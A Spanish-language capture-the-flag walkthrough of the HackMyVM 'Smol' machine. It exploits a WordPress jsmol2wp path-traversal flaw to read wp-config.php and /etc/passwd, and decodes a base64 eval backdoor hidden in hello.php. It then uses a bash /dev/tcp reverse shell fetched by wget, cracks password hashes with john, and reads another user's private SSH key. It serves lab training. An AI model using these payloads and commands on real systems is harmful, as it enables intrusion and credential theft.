---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Smol HackMyVM (Intermediate - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-04 05:47 EDT
Nmap scan report for 192.168.1.169
Host is up (0.00044s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://www.smol.hmv
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 08:00:27:D5:03:1C (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.83 seconds
```

Vemos que tiene una pagina web alojada en el puerto `80`, pero ya de primeras vemos que nos redirije al siguiente dominio llamado `www.smol.hmv` por lo que lo añadiremos a nuestro archivo `hosts`:

```shell
nano /etc/hosts

#Dentro del nano
<IP>           www.smol.hmv
```

Lo guardamos y volveremos a cargar la pagina, veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Veremos que ahora si funciona, si bajamos al `footer` veremos que esta `hosteado` por `wordpress` por lo que vamos a realizar un escaneo con la herramienta llamada `wpscan`.

## wpscan

```shell
wpscan --url http://www.smol.hmv/ --enumerate u
```

Info:

```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://www.smol.hmv/ [192.168.1.169]
[+] Started: Fri Apr  4 05:54:40 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://www.smol.hmv/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://www.smol.hmv/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://www.smol.hmv/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://www.smol.hmv/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.2 identified (Latest, released on 2025-02-11).
 | Found By: Rss Generator (Passive Detection)
 |  - http://www.smol.hmv/index.php/feed/, <generator>https://wordpress.org/?v=6.7.2</generator>
 |  - http://www.smol.hmv/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.7.2</generator>

[+] WordPress theme in use: popularfx
 | Location: http://www.smol.hmv/wp-content/themes/popularfx/
 | Last Updated: 2024-11-19T00:00:00.000Z
 | Readme: http://www.smol.hmv/wp-content/themes/popularfx/readme.txt
 | [!] The version is out of date, the latest version is 1.2.6
 | Style URL: http://www.smol.hmv/wp-content/themes/popularfx/style.css?ver=1.2.5
 | Style Name: PopularFX
 | Style URI: https://popularfx.com
 | Description: Lightweight theme to make beautiful websites with Pagelayer. Includes 100s of pre-made templates to ...
 | Author: Pagelayer
 | Author URI: https://pagelayer.com
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://www.smol.hmv/wp-content/themes/popularfx/style.css?ver=1.2.5, Match: 'Version: 1.2.5'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <===============================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] think
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://www.smol.hmv/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] wp
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://www.smol.hmv/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] Jose Mario Llado Marti
 | Found By: Rss Generator (Passive Detection)

[+] wordpress user
 | Found By: Rss Generator (Passive Detection)

[+] admin
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://www.smol.hmv/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] gege
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] diego
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] xavi
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Apr  4 05:54:42 2025
[+] Requests Done: 74
[+] Cached Requests: 6
[+] Data Sent: 19.008 KB
[+] Data Received: 13.795 MB
[+] Memory used: 195.5 MB
[+] Elapsed time: 00:00:01
```

Veremos varios usuarios, ahora vamos a ver si sacamos la contraseña alguno:

> users.txt

```
admin
gege
diego
xavi
```

```shell
wpscan --url http://www.smol.hmv/ --usernames users.txt --passwords <WORDLIST>
```

Info:

```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://www.smol.hmv/ [192.168.1.169]
[+] Started: Fri Apr  4 05:56:43 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://www.smol.hmv/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://www.smol.hmv/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://www.smol.hmv/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://www.smol.hmv/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.2 identified (Latest, released on 2025-02-11).
 | Found By: Rss Generator (Passive Detection)
 |  - http://www.smol.hmv/index.php/feed/, <generator>https://wordpress.org/?v=6.7.2</generator>
 |  - http://www.smol.hmv/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.7.2</generator>

[+] WordPress theme in use: popularfx
 | Location: http://www.smol.hmv/wp-content/themes/popularfx/
 | Last Updated: 2024-11-19T00:00:00.000Z
 | Readme: http://www.smol.hmv/wp-content/themes/popularfx/readme.txt
 | [!] The version is out of date, the latest version is 1.2.6
 | Style URL: http://www.smol.hmv/wp-content/themes/popularfx/style.css?ver=1.2.5
 | Style Name: PopularFX
 | Style URI: https://popularfx.com
 | Description: Lightweight theme to make beautiful websites with Pagelayer. Includes 100s of pre-made templates to ...
 | Author: Pagelayer
 | Author URI: https://pagelayer.com
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://www.smol.hmv/wp-content/themes/popularfx/style.css?ver=1.2.5, Match: 'Version: 1.2.5'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] jsmol2wp
 | Location: http://www.smol.hmv/wp-content/plugins/jsmol2wp/
 | Latest Version: 1.07 (up to date)
 | Last Updated: 2018-03-09T10:28:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.07 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://www.smol.hmv/wp-content/plugins/jsmol2wp/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://www.smol.hmv/wp-content/plugins/jsmol2wp/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <==============================================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 4 user/s
^Cying xavi / 321654987 Time: 00:01:31 <                                                                           > (15008 / 57377568)  0.02%  ETA: 97:04:16
[i] No Valid Passwords Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.                                 > (15010 / 57377568)  0.02%  ETA: 97:04:50
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Apr  4 05:58:18 2025
[+] Requests Done: 15159
[+] Cached Requests: 35
[+] Data Sent: 7.674 MB
[+] Data Received: 8.865 MB
[+] Memory used: 321.797 MB
[+] Elapsed time: 00:01:35

Scan Aborted: Canceled by User
```

No veremos que consigamos ninguna credencial, pero veremos la siguiente seccion de `plugins` los cuales pueden ser vulnerables:

```
[i] Plugin(s) Identified:

[+] jsmol2wp
 | Location: http://www.smol.hmv/wp-content/plugins/jsmol2wp/
 | Latest Version: 1.07 (up to date)
 | Last Updated: 2018-03-09T10:28:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.07 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://www.smol.hmv/wp-content/plugins/jsmol2wp/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://www.smol.hmv/wp-content/plugins/jsmol2wp/readme.txt
```

Vamos a buscar si tuviera alguna vulnerabilidad dicho `plugin`, veremos que si hay una vulnerabilidad y nos muestra el `POC` de dicha vulnerabilidad:

URL = [PoC Vuln jsmol2wp](https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-2018-20463-CVE-2018-20462.txt)

Por lo que tendremos que ajustarlo a nuestras necesidades, quedando de la siguiente forma:

```
URL = http://www.smol.hmv/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
```

Si nos metemos aqui para poder ver el archivo llamado `wp-config.php`, veremos que nos deja:

```
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wpuser' );

/** Database password */
define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

Por lo que si intentamos leer el archivo `passwd` veremos que tambien nos deja:

```
URL = http://www.smol.hmv/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../../../../etc/passwd
```

Info:

```
root:x:0:0:root:/root:/usr/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
think:x:1000:1000:,,,:/home/think:/bin/bash
fwupd-refresh:x:113:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
xavi:x:1001:1001::/home/xavi:/bin/bash
diego:x:1002:1002::/home/diego:/bin/bash
gege:x:1003:1003::/home/gege:/bin/bash
```

Vemos varios usuarios en el sistema:

```
think (1)
xavi (2)
diego (3)
gege (4)
```

Viendo respecto al `ID` que tiene cada uno, podemos saber que el primero el haberse creado es `think` por lo que vamos a probar fuerza bruta con dicho usuario.

Si probamos a conectarnos mediante `ssh` para probar, veremos lo siguiente:

```shell
ssh think@<IP>
```

Info:

```
think@192.168.1.169: Permission denied (publickey).
```

Vemos que requiere de una clave `PEM` por lo que vamos a probar a leer una `id_rsa` de algun usuario, pero veremos que no podremos, por lo que vamos a utilizar la anterior informacion que obtuvimos con el archivo `wp-config.php` para intentar iniciar sesion en `wordpress`.

```
URL = http://www.smol.hmv/wp-admin/
```

Y metemos como credenciales lo siguiente:

```
User: wpuser
Pass: kbLSF2Vop#lw3rjDZ629*Z%G
```

Veremos que si funciona y estaremos dentro, pero no somos `administradores`, por lo que vamos a realizar `fuzzing` para ver que `plugins` hay y poder leerlos.

```shell
ffuf -ic -c -u 'http://www.smol.hmv/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../FUZZ' -w ../Downloads/wp-plugins.fuzz.txt -fs 2
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://www.smol.hmv/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../FUZZ
 :: Wordlist         : FUZZ: /home/kali/Downloads/wp-plugins.fuzz.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 2
________________________________________________

wp-content/plugins/hello.php [Status: 200, Size: 2704, Words: 321, Lines: 104, Duration: 1ms]
:: Progress: [13370/13370] :: Job [1/1] :: 34 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```

Veremos que nos ha encontrado un archivo llamado `wp-content/plugins/hello.php` por lo que vamos a intentar leerlo con dicha vulnerabilidad:

```
URL = http://www.smol.hmv/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php
```

Info:

```
<?php
/**
 * @package Hello_Dolly
 * @version 1.7.2
 */
/*
Plugin Name: Hello Dolly
Plugin URI: http://wordpress.org/plugins/hello-dolly/
Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from <cite>Hello, Dolly</cite> in the upper right of your admin screen on every page.
Author: Matt Mullenweg
Version: 1.7.2
Author URI: http://ma.tt/
*/

function hello_dolly_get_lyric() {
	/** These are the lyrics to Hello Dolly */
	$lyrics = "Hello, Dolly
Well, hello, Dolly
It's so nice to have you back where you belong
You're lookin' swell, Dolly
I can tell, Dolly
You're still glowin', you're still crowin'
You're still goin' strong
I feel the room swayin'
While the band's playin'
One of our old favorite songs from way back when
So, take her wrap, fellas
Dolly, never go away again
Hello, Dolly
Well, hello, Dolly
It's so nice to have you back where you belong
You're lookin' swell, Dolly
I can tell, Dolly
You're still glowin', you're still crowin'
You're still goin' strong
I feel the room swayin'
While the band's playin'
One of our old favorite songs from way back when
So, golly, gee, fellas
Have a little faith in me, fellas
Dolly, never go away
Promise, you'll never go away
Dolly'll never go away again";

	// Here we split it into lines.
	$lyrics = explode( "\n", $lyrics );

	// And then randomly choose a line.
	return wptexturize( $lyrics[ mt_rand( 0, count( $lyrics ) - 1 ) ] );
}

// This just echoes the chosen line, we'll position it later.
function hello_dolly() {
	eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
	
	$chosen = hello_dolly_get_lyric();
	$lang   = '';
	if ( 'en_' !== substr( get_user_locale(), 0, 3 ) ) {
		$lang = ' lang="en"';
	}

	printf(
		'<p id="dolly"><span class="screen-reader-text">%s </span><span dir="ltr"%s>%s</span></p>',
		__( 'Quote from Hello Dolly song, by Jerry Herman:' ),
		$lang,
		$chosen
	);
}

// Now we set that function up to execute when the admin_notices action is called.
add_action( 'admin_notices', 'hello_dolly' );

// We need some CSS to position the paragraph.
function dolly_css() {
	echo "
	<style type='text/css'>
	#dolly {
		float: right;
		padding: 5px 10px;
		margin: 0;
		font-size: 12px;
		line-height: 1.6666;
	}
	.rtl #dolly {
		float: left;
	}
	.block-editor-page #dolly {
		display: none;
	}
	@media screen and (max-width: 782px) {
		#dolly,
		.rtl #dolly {
			float: none;
			padding-left: 0;
			padding-right: 0;
		}
	}
	</style>
	";
}

add_action( 'admin_head', 'dolly_css' );
```

Veremos que funciona y en esta parte estamos viendo algo interesante:

```
eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
```

Que decodificado quedaria asi:

```
 if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); } 
```

## Escalate user www-data

Veremos que esta en un codigo de `direccion de memoeria` en `little endian` (`octal` y `hexadecimal`), que quedaria asi:

* `\143` (octal) = **`c`**
* `\155` (octal) = **`m`**
* `\x64` (hex) = **`d`**

Palabra: `cmd`

Por lo que vemos podremos ejecutar comando mediante ese parametro, por lo que nos generaremos una `reverse shell` de la siguiente forma:

```shell
nano shell.sh

#Dentro del nano
#!/bin/bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

Lo guardamos y haremos lo siguiente:

Abriremos un servidor de `python3`:

```shell
python3 -m http.server 8000
```

Ahora nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Y seguidamente ejecutaremos lo siguiente:

```
URL = http://www.smol.hmv/wp-admin/?cmd=wget http://<IP>:8000/shell.sh
URL = http://www.smol.hmv/wp-admin/?cmd=wget http://<IP>:8000/bash shell.sh
```

Si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.1.146] from (UNKNOWN) [192.168.1.169] 38262
bash: cannot set terminal process group (818): Inappropriate ioctl for device
bash: no job control in this shell
www-data@smol:/var/www/wordpress/wp-admin$ whoami
whoami
www-data
```

Veremos que ha funcionado, por lo que seremos dicho usuario, ahora vamos a sanitizar la `shell`.

### Sanitizacion de shell

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user diego

Nos acordamos de que tenemos las credenciales para poder entrar en `mysql`, vamos a ver si encontramos credenciales registradas de algun usuario del sistema en dicha base de datos.

```shell
mysql -u wpuser -pkbLSF2Vop#lw3rjDZ629*Z%G
```

Dentro seleccionaremos dicha base de datos:

```sql
use wordpress;
```

Ahora vamos a ver la `DDBB` de la tabla usuarios.

```sql
select * from wp_users;
```

Info:

```
+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
| ID | user_login | user_pass                          | user_nicename | user_email         | user_url            | user_registered     | user_activation_key | user_status | display_name           |
+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
|  1 | admin      | $P$B5Te3OJvzvJ7NjDDeHZcOKqsQACvOJ0 | admin         | admin@smol.thm     | http://www.smol.hmv | 2023-08-16 06:58:30 |                     |           0 | admin                  |
|  2 | wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. | wp            | wp@smol.thm        | http://smol.thm     | 2023-08-16 11:04:07 |                     |           0 | wordpress user         |
|  3 | think      | $P$B0jO/cdGOCZhlAJfPSqV2gVi2pb7Vd/ | think         | josemlwdf@smol.thm | http://smol.thm     | 2023-08-16 15:01:02 |                     |           0 | Jose Mario Llado Marti |
|  4 | gege       | $P$BsIY1w5krnhP3WvURMts0/M4FwiG0m1 | gege          | gege@smol.thm      | http://smol.thm     | 2023-08-17 20:18:50 |                     |           0 | gege                   |
|  5 | diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 | diego         | diego@smol.thm     | http://smol.thm     | 2023-08-17 20:19:15 |                     |           0 | diego                  |
|  6 | xavi       | $P$BvcalhsCfVILp2SgttADny40mqJZCN/ | xavi          | xavi@smol.thm      | http://smol.thm     | 2023-08-17 20:20:01 |                     |           0 | xavi                   |
+----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
6 rows in set (0.00 sec)
```

Vemos que la mayoria de nombres estan en el sistema, por lo que vamos a intentar `crackear` alguna contraseña.

Vamos a crear un listado de `hashes` para intentar `crackearlos`:

> hash

```
think:$P$B0jO/cdGOCZhlAJfPSqV2gVi2pb7Vd/
gege:$P$BsIY1w5krnhP3WvURMts0/M4FwiG0m1
diego:$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1
xavi:$P$BvcalhsCfVILp2SgttADny40mqJZCN/
admin:$P$B5Te3OJvzvJ7NjDDeHZcOKqsQACvOJ0
```

```shell
john --wordlist=<WORDLIST> hash
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sandiegocalifornia (diego)     
1g 0:00:01:00 DONE (2025-04-08 02:35) 0.01660g/s 21865p/s 21865c/s 21865C/s sandr1ta..sandervandoorn
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed.
```

Vemos que ha funcionado y obtendremos unas credenciales, por lo que vamos a intentar conectarnos por `SSH` para tener una mejor `shell`.

Pero antes tendremos que escalar a `diego` para generarnos una clave `PEM` ya que solo podemos entrar por eso.

```shell
su diego
```

Metemos como contraseña `sandiegocalifornia`, por lo que leeremos la `flag` del usuario.

> user.txt

```
45edaec653ff9ee06236b7ce72b86963
```

## Escalate user think

Si listamos las carpetas de la `/home` veremos lo siguiente:

```shell
ls -la /home
```

Info:

```
total 24
drwxr-xr-x  6 root  root     4096 Aug 16  2023 .
drwxr-xr-x 18 root  root     4096 Mar 29  2024 ..
drwxr-x---  3 diego internal 4096 Apr  8 06:39 diego
drwxr-x---  2 gege  internal 4096 Aug 18  2023 gege
drwxr-x---  5 think internal 4096 Jan 12  2024 think
drwxr-x---  2 xavi  internal 4096 Aug 18  2023 xavi
```

Vemos que esta dentro del grupo `internal` y si vemos a que grupo pertenecemos, veremos lo siguiente:

```shell
id
```

Info:

```
uid=1002(diego) gid=1002(diego) groups=1002(diego),1005(internal)
```

Vemos que pertenecemos, por lo que podremos entrar dentro de las carpetas de la `home`, si investigamos veremos una en concreto bastante interesante, que seria la del usuario `think`, vemos que tiene una clave `PEM` en la que podremos meternos y leerla.

```shell
cd /home/think/.ssh/
cat id_rsa
```

Veremos que nos deja, por lo que nos copiaremos el `id_rsa` pasandolo a nuestro `host`.

